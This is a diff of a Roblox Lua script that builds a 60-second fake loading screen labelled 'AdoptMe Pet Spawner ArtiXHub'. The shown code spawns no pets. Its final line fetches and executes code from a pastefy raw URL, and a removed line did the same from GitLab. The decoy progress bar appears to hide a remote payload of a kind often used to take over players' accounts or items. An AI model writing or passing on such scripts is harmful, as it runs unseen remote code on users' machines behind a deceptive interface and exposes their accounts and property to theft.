@@ -1,3 +1,124 @@
-local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkdark/dark/-/raw/main/Spawner.lua"))()
-Spawner.Load()
+local TweenService = game:GetService("TweenService")
+
+-- Создаём ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Фон
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+bg.BackgroundTransparency = 1
+bg.Parent = screenGui
+
+-- Заголовок
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 100)
+title.Position = UDim2.new(0, 0, 0.35, 0)
+title.BackgroundTransparency = 1
+title.Text = "AdoptMe Pet Spawner ArtiXHub"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+title.TextTransparency = 1
+title.Parent = bg
+
+-- Контейнер полоски
+local barContainer = Instance.new("Frame")
+barContainer.Size = UDim2.new(0.6, 0, 0, 25)
+barContainer.Position = UDim2.new(0.2, 0, 0.52, 0)
+barContainer.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+barContainer.BorderSizePixel = 0
+barContainer.BackgroundTransparency = 1
+barContainer.Parent = bg
+
+-- Заполняемая полоска
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barContainer
+
+-- Проценты
+local percentText = Instance.new("TextLabel")
+percentText.Size = UDim2.new(1, 0, 0, 40)
+percentText.Position = UDim2.new(0, 0, 0.56, 30)
+percentText.BackgroundTransparency = 1
+percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentText.Font = Enum.Font.GothamBold
+percentText.TextScaled = true
+percentText.Text = "0%"
+percentText.TextTransparency = 1
+percentText.Parent = bg
+
+-------------------------------------------------------
+-- 🌟 ПЛАВНОЕ ПОЯВЛЕНИЕ ВСЕГО ЭКРАНА
+-------------------------------------------------------
+local fadeIn = TweenService:Create(bg, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
+    BackgroundTransparency = 0
+})
+local textIn = TweenService:Create(title, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
+    TextTransparency = 0
+})
+local barIn = TweenService:Create(barContainer, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
+    BackgroundTransparency = 0
+})
+local percentIn = TweenService:Create(percentText, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
+    TextTransparency = 0
+})
+
+fadeIn:Play()
+textIn:Play()
+barIn:Play()
+percentIn:Play()
+
+task.wait(1.2)
+
+-------------------------------------------------------
+-- 🔵 КРАСИВАЯ АНИМАЦИЯ ПОЛОСКИ (smooth easing)
+-------------------------------------------------------
+
+local duration = 60  -- 60 секунд
+local steps = 100
+
+for i = 0, steps do
+    percentText.Text = i .. "%"
+
+    -- плавная анимация движения полоски при каждом шаге
+    TweenService:Create(
+        barFill,
+        TweenInfo.new(duration / steps, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
+        { Size = UDim2.new(i/100, 0, 1, 0) }
+    ):Play()
+
+    task.wait(duration / steps)
+end
+
+-------------------------------------------------------
+-- 🌙 ПЛАВНОЕ ИСЧЕЗНОВЕНИЕ
+-------------------------------------------------------
+
+local fadeOut = TweenService:Create(bg, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
+    BackgroundTransparency = 1
+})
+local textOut = TweenService:Create(title, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
+    TextTransparency = 1
+})
+local barOut = TweenService:Create(barContainer, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
+    BackgroundTransparency = 1
+})
+local percentOut = TweenService:Create(percentText, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
+    TextTransparency = 1
+})
+
+fadeOut:Play()
+textOut:Play()
+barOut:Play()
+percentOut:Play()
+
+task.wait(1.3)
+bg:Destroy()
+
 loadstring(game:HttpGet("https://pastefy.app/BLldvDWO/raw"))()
